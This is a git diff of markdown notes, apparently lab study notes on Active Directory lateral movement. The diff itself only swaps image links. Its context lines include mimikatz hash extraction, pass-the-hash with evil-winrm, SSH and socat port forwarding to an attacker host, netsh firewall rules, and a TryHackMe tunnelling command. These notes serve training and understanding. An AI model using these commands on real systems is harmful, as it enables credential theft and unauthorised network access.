@@ -182,7 +182,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Insta
 ### Alternate Authentication
 
 #### NTLM Auth
-![[Pasted image 20241228201220.png]]
+![NTLM Authentication Process](img/blog/ntlm-auth-process.png)
 If the Windows domain is configured to use NTLM Auth
 Can extract NTLM hashes w/ mimi from either local SAM db or from LSASS mem
 
@@ -220,13 +220,18 @@ evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
 Client sends timestamp enc w/ key derived from password (alg to derive can be DES (disabled by default on current Windows), RC4, AES128, AES256, depending on installed win version and kerb config.) to KDC
 KDC sends back TGT, which allows client to req tickets to services w/o giving that service their creds, alongside a Session Key
 * TGT enc using krbtgt hash, encrypted TGT includes copy of session key, KDC doesn't need to store session key as it can decrypt TGT if needed
-![[Pasted image 20241228202513.png]]
+
+![Kerberos TGT Process](img/blog/kerb-tgt-process.png)
+
 User uses TGT to ask KDC for TGS (Ticket Granting Service) - Grants tickets for connection to only service. User sends username and timestamp enc using the session key, along with the TGT and a Service Principal Name (SPN), indicating service and server name intended to access.
 
 KDC will respond with TGS and Svc Session Key, needed to auth to service. TGS encrypted using Service Owner Hash. Service Owner is user/machine under which service runs. TGS contains copy of Svc Session Key in enc contents so that Service Owner can Access by decrypting TGS.
-![[Pasted image 20241228202825.png]]
+
+![Kerberos TGS Process](img/blog/kerb-tgs-process.png)
+
 TGS sent to service to auth and establish conn. Service will use its accounts password hash to decrypt TGS and validate Svc Session Key
-![[Pasted image 20241228202839.png]]
+
+![Kerberos Service Authentication](img/blog/kerb-serv-auth.png)
 
 #### Pass-the-Ticket
 
@@ -367,7 +372,7 @@ passwd tunneluser
 
 #### SSH Remote Port Forwarding
 
-![[Pasted image 20241229123054.png]]
+![SSH Remote Port Forwarding](img/blog/ssh-remote-port-forward.png)
 Remote allows reachable port from client (pivot victim), project it to remote server (attacker)
 
 Powershell port scan test
@@ -382,7 +387,8 @@ C:\> ssh tunneluser@ATTACKER -R ATTACKER_PORT:VICTIM:VICTIM_PORT -N
 
 #### SSH Local Port Forwarding
 
-![[Pasted image 20241229123626.png]]
+![SSH Local Port Forwarding](img/blog/ssh-local-port-forward.png)
+
 Make any service available on attacker PC and make it available through a port on PC-1, including reverse shells.
 
 ```shell-session
@@ -404,7 +410,7 @@ netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow prot
 C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
 C:\>socat TCP4-LISTEN:MEDIARY_PORT,fork TCP4:VICTIM_IP:VICTIM_PORT
 ```
-![[Pasted image 20241229124655.png]]
+![Socat Remote Port Forwarding](img/blog/socat-remote-port-forward.png)
 
 Socat won't forward conn directly to attacker but will open port on PC-1
 Needs firewall allowance
@@ -414,7 +420,7 @@ netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow pr
 ```
 
 ##### Local
-![[Pasted image 20241229124714.png]]
+![Socat Local Port Forwarding](img/blog/socat-local-port-forward.png)
 
 ```cmd
 C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
@@ -442,9 +448,9 @@ Nmap may not work well with SOCKS and might show altered results
 
 #### Tunnelling Complex Exploits
 
-![[Pasted image 20241229131052.png]]
+![Complex Tunnelling Setup](img/blog/complex-tunnelling-setup.png)
 
-![[Pasted image 20241229131626.png]]
+![Tunnelling Exploit Chain](img/blog/tunnelling-exploit-chain.png)
 ```sh
 C:\> ssh tun@10.50.100.173 -R 8888:thmdc.za.tryhackme.com:80 -L *:62930:127.0.0.1:62930 -L *:62928:127.0.0.1:62928 -N
 
